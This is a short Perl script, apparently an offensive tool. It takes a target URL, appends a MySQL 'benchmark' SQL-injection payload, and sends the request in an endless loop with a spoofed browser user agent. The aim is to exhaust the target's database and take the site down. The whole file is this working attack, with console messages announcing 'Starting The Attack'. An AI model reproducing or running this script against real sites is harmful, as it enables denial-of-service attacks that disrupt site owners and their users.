use LWP::UserAgent;

                                            

my $nave = LWP::UserAgent->new;

$nave->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12");
$nave->agent("Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201");

$nave->timeout(5);



if ($ARGV[0]) {

	now($ARGV[0]);

} else {

	usage();

}



sub now {

	print "\n[+] URL:: " . $_[0] . "\n";

	print "\n[+] Starting The Attack, Please Wait...\n[+] Info: Control+C to stop attack\n\n";



	while(true) {

		$SIG{INT} = \&adios;



		$code = toma($_[0]." and (select+benchmark(300000,0x70726f62616e646f70726f62616e646f70726f62616e646f))");



		unless($code->is_success) {


                        print "Voly Sent\n";

		}

	}

}



sub adios {

	print "\n[+] Stopping The Attack. Please Wait...\n";

	exit 0;

}



sub usage {

	print "[+] Usage: $0 <target>\n";

	exit 0;

}



sub toma {

	return $nave->get($_[0]);

}